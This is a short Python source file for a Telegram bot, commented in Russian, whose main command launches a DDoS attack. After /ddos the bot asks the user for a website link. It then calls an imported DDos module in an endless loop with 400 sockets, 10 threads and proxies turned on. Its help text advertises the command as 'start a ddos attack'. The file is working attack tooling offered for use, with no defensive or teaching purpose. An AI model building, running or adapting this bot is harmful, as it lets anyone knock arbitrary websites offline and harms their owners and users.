# Импотируем модули
import DDos
import telebot
import settings as cfg
# Запуск бота
import telebot

bot = telebot.TeleBot(cfg.token, parse_mode=None)
# Команда /start
@bot.message_handler(commands=['start'])
def start (message):
    bot.reply_to(message, "Привет мой владелец! Напиши /help чтобы увидеть список команд")
# Команда /help
@bot.message_handler(commands=['help'])
def help (message):
    bot.send_message(message.chat.id, "Список команд:\n /ddos - Начать ddos атаку \n /help - список команд \n /author - автор кода бота")
# Команда /ddos
@bot.message_handler(commands=['ddos'])
def ddosa (message):
    msg = bot.send_message(message.chat.id, "Введите ссылку на сайт!")
    bot.register_next_step_handler(msg, ddoss)
def ddoss (message):
  url = message.text
  bot.send_message(message.chat.id, "ДДос начался")
  while True:
    DDos.DDos(url, sockets = 400, threads = 10, use_proxies = True)
   
# Команда /author
@bot.message_handler(commands=['author'])
def author (message):
  bot.send_message(message.chat.id, "Написал код данного бота: 0xSn1kky =)")
  
bot.polling(none_stop=True, interval=0)